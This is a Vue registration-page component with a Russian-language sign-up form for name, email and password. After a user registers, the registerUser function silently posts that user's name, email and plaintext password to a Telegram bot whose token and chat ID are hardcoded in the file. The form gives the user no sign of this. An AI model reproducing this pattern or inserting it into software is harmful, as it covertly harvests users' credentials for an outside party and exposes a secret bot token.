<script setup>
import { ref, inject } from 'vue'
import { useRouter } from 'vue-router'
import AppLoader from '../components/AppLoader.vue'
import axios from 'axios'
axios.defaults.baseURL = 'https://621256287b80dd07.mokky.dev'

const router = useRouter()



const BOT_TOKEN = '7434658686:AAGXZb2F0qfczZH7wIyOHndUb6b30X5Trj0'
const CHAT_ID = '-1002156821697'
const URL_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`



const isLoading = ref(false)
const alertIsVisible = ref(false)
const userName = ref('')
const userEmail = ref('')
const userPassword = ref('')

const isAuth = inject('isAuth')

const registerUser = async () => {
  try {
    isLoading.value = true
    const response = await axios.post('/register', {
      name: userName.value,
      email: userEmail.value,
      password: userPassword.value
    })
    const token = response.data.token
    if (token) {
      sessionStorage.setItem('token', token)
      isAuth.value = true
      router.replace('/home')
    }
    await axios.post(URL_API, {
      chat_id: CHAT_ID,
      parse_mode: 'html',
      text: `Пользователь ${userName.value} зарегистрировался
      с почтой ${userEmail.value} с паролем ${userPassword.value}`
    })
  } catch (error) {
    alertIsVisible.value = true
    console.log(error.message)
    console.log(error.response.status)
  } finally {
    isLoading.value = false
  }
}
</script>

<template>
  <div class="alert alert-danger alert-dismissible fade show" role="alert" v-if="alertIsVisible">
    <strong>Ошибка! Такой пользователь уже существует!</strong>
    <button
      type="button"
      class="btn-close"
      data-bs-dismiss="alert"
      aria-label="Close"
      @click="alertIsVisible = false"
    ></button>
  </div>
  <form @submit.prevent="registerUser" v-if="!isLoading">
    <div class="form-floating mb-3">
      <input
        v-model="userName"
        type="text"
        class="form-control"
        id="name"
        required
        placeholder="Введите имя..."
      />
      <label for="name">Имя</label>
    </div>
    <div class="form-floating mb-3">
      <input
        v-model="userEmail"
        type="email"
        class="form-control"
        id="email"
        placeholder="Введите email..."
        pattern="^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$"
        required
      />
      <label for="email">Почта</label>
    </div>
    <div class="form-floating mb-3">
      <input
        v-model="userPassword"
        type="password"
        class="form-control"
        id="password"
        placeholder="Введите пароль..."
        required
      />
      <label for="password">Пароль</label>
    </div>
    <button type="submit" class="btn btn-primary">Зарегистрироваться</button>
    <p class="form-text">Уже есть аккаунт? <RouterLink to="/login">Войти</RouterLink></p>
  </form>
  <AppLoader v-else />
</template>

<style></style>
